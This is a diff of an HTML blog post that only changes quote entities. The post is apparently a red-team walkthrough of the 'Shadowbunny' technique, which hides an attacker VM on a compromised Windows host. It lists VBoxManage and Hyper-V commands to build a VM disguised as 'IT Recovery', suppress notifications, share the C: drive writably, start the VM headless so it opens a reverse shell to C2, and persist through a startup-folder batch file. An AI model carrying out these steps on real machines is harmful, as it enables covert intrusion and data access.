@@ -256,7 +256,7 @@ Enter-PSSession -Computer dangerzone -Port 5986 -Credential $creds -SessionOptio
 <p>This post is focused on VirtualBox, but we will also cover some of the basic commands for Hyper-V along the way (Hyper-V is already present on Windows machines, so no need to download).</p>
 <p>The current installer (as of writing this) for Windows is located at <a href="https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe">https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe</a>.</p>
 <p>To quickly download the installer onto the target run:</p>
-<pre tabindex="0"><code>Invoke-WebRequest &quot;https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe&quot; -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
+<pre tabindex="0"><code>Invoke-WebRequest &#34;https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe&#34; -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
 </code></pre><p><strong>Note:</strong> The version used above is likely outdated when you read this. Also the &ldquo;Guest Additions&rdquo; have to match the VirtualBox version.</p>
 <p>The following screenshot shows pivoting on the target host “dangerzone” and download VirtualBox:
 <img src="/blog/images/2020/shadowbunny-step3.png" alt="Shadowbunny Download Virtual Box"></p>
@@ -298,7 +298,7 @@ VBoxManage startvm
 </code></pre><p>To create the new VM during lateral movement we will run a sequence of commands via VBoxManage, the management tool of VirtualBox. In the end the configuration is stored in an XML definition file, which can be registered with VBoxManage command as well.</p>
 <h3 id="disabling-notifications">Disabling notifications</h3>
 <p>Optionally one can configure more settings of the product, for instance to suppress pop-up notifications:</p>
-<pre tabindex="0"><code>VBoxManage.exe setextradata global GUI/SuppressMessages &quot;all&quot; 
+<pre tabindex="0"><code>VBoxManage.exe setextradata global GUI/SuppressMessages &#34;all&#34; 
 </code></pre><p>Now that we know the basics of VBoxManage, let’s create move towards creation of the VM.</p>
 <h2 id="download-the-custom-shadowbunny-vm-disk-image-to-the-host">Download the custom Shadowbunny VM disk image to the host</h2>
 <p>Like downloading the installation package, this can be done via multiple means.</p>
@@ -310,12 +310,12 @@ VBoxManage startvm
 <ul>
 <li>
 <p>The following command will create the new VM:</p>
-<pre tabindex="0"><code>$vmname = &quot;IT Recovery&quot;
-.\VBoxManage.exe createvm --name $vmname --ostype &quot;Ubuntu&quot; --register
+<pre tabindex="0"><code>$vmname = &#34;IT Recovery&#34;
+.\VBoxManage.exe createvm --name $vmname --ostype &#34;Ubuntu&#34; --register
 </code></pre><p>This will create the VM and also register it right away, the output is the following:</p>
-<pre tabindex="0"><code>Virtual machine 'IT Recovery' is created and registered.
+<pre tabindex="0"><code>Virtual machine &#39;IT Recovery&#39; is created and registered.
 UUID: 7891a2bd-e9cc-432a-ae2a-ba1fb2de96a4
-Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'
+Settings file: &#39;C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox&#39;
 </code></pre><p>Notice the settings file with the <code>.vbox</code> extension. This is the xml configuration file of the VM.</p>
 </li>
 <li>
@@ -326,7 +326,7 @@ Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'
 .\VBoxManage.exe modifyvm $vmname --nic1 nat
 .\VBoxManage.exe modifyvm $vmname --audio none
 .\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
-.\VBoxManage.exe modifyvm $vmname --description &quot;Shadowbunny&quot;
+.\VBoxManage.exe modifyvm $vmname --description &#34;Shadowbunny&#34;
 </code></pre></li>
 <li>
 <p>Now it’s time to mount the Shadowbunny image</p>
@@ -346,7 +346,7 @@ Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'
 <pre tabindex="0"><code>.\VBoxManage.exe sharedfolder add $vmname –name shadow_c –hostpath c:\ -automount
 </code></pre><p>Shared folders are configured via the xml configuration file. After running above command the following is visible in the configuration file:</p>
 <pre tabindex="0"><code>&lt;SharedFolders&gt;
-   &lt;SharedFolder name=&quot;shadow_c&quot; hostPath=&quot;c:\&quot; writable=&quot;true&quot; autoMount=&quot;true&quot;/&gt;
+   &lt;SharedFolder name=&#34;shadow_c&#34; hostPath=&#34;c:\&#34; writable=&#34;true&#34; autoMount=&#34;true&#34;/&gt;
 &lt;/SharedFolders&gt;
 </code></pre><p>Inside the VM (considering it is Linux based), one can simple mount the drive via (in case it wasn&rsquo;t auto mounted)</p>
 <pre tabindex="0"><code>sudo mkdir /mnt/c
@@ -357,10 +357,10 @@ sudo mount -t vboxsf shadow_c /mnt/c
 <p>As can be seen in in the screenshot, the virtual machine <strong>“IT Recovery”</strong> was successfully created and is currently powered off. Let’s power it on.</p>
 <h2 id="launching-the-virtual-machine">Launching the virtual machine</h2>
 <p>Voila, now it’s time to start the VM.</p>
-<pre tabindex="0"><code>.\VBoxManage.exe startvm &quot;IT Recovery&quot; –type headless 
+<pre tabindex="0"><code>.\VBoxManage.exe startvm &#34;IT Recovery&#34; –type headless 
 </code></pre><p>This will start up the VM and after a second print out a message like:</p>
-<pre tabindex="0"><code>Waiting for VM &quot;IT Recovery&quot; to power on...
-VM &quot;IT Recovery &quot; has been successfully started.
+<pre tabindex="0"><code>Waiting for VM &#34;IT Recovery&#34; to power on...
+VM &#34;IT Recovery &#34; has been successfully started.
 </code></pre><p>Now, the VM will boot up.</p>
 <p>Remember, that we added a <code>cron</code> job to the Shadowbunny VM. This means after a few moments the VM will establish a reverse shell to the command and control infrastructure.</p>
 <p>The following screen shows the outcome as seen by the C2:
@@ -377,7 +377,7 @@ VM &quot;IT Recovery &quot; has been successfully started.
 <ul>
 <li>
 <p>Create a file <code>config.bat</code> with the following command in it:</p>
-<pre tabindex="0"><code>start /min &quot;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&quot; startvm &quot;IT Recovery&quot; –type headless
+<pre tabindex="0"><code>start /min &#34;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&#34; startvm &#34;IT Recovery&#34; –type headless
 </code></pre></li>
 <li>
 <p>Save the file to the victim’s startup folder at:
@@ -390,12 +390,12 @@ VM &quot;IT Recovery &quot; has been successfully started.
 <p><code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All</code> or <code>DISM /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V</code>.</p>
 <p>Notice: This requires a reboot of the machine.</p>
 <p>Then PowerShell commands can be used to create/manage machines:</p>
-<pre tabindex="0"><code>$VM = &quot;IT Recovery&quot;
+<pre tabindex="0"><code>$VM = &#34;IT Recovery&#34;
 New-VM -Name $VM
        -MemoryStartupBytes 2147483648
        -Generation 2
-       -VHDPath &quot;C:\Users\...\Virtual Hard Disks\shadowbunny.vhdx&quot;
-       -Path &quot;C:\Users\All Users\Documents\Hyper-V\shadowbunny&quot;
+       -VHDPath &#34;C:\Users\...\Virtual Hard Disks\shadowbunny.vhdx&#34;
+       -Path &#34;C:\Users\All Users\Documents\Hyper-V\shadowbunny&#34;
        -SwitchName (Get-VMSwitch).Name
 
 Set-VMFirmware $VM -EnableSecureBoot Off
